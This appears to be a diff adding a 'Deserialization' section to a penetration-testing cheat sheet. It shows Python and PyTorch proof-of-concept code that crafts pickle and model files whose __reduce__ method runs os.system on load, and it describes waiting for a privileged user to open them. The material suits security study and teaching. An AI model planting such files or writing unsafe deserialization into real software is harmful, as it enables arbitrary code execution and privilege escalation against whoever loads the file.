@@ -424,6 +424,39 @@ ps aux | grep remote-debugging-port
 netstat -tuln
 ```
 
+## Deserialization
+
+### Python
+```python
+# 1. Create a malicious pickle file
+import os, pickle
+class Evil():
+    def __reduce__(self):
+        return (os.system, ("whoami",))
+evil = Evil()
+pickle.dump(evil, open("evil.pkl", "wb"))
+
+# 2. Wait for the following code to be executed by a privileged user
+>>> pickle.load(open("evil.pkl", "rb"))
+```
+
+### PyTorch
+```python
+# PyTorch internally uses Python's pickle module for serialization and deserialization of objects
+# 1. Create a malicious PyTorch model file
+import torch, os
+class Model():
+    def __reduce__(self):
+        return (os.system,("whoami",))
+model = Model()
+torch.save(model, 'model.pth')
+
+# 2. Wait for the following code to be executed by a privileged user
+>>> torch.load('model.pth')
+```
+> - https://medium.com/@coding-otter/understanding-pickle-risks-essential-knowledge-for-data-scientists-1f187feb455b
+
+
 # CVEs
 
 ## CVE-2007-2447: Samba [RCE]
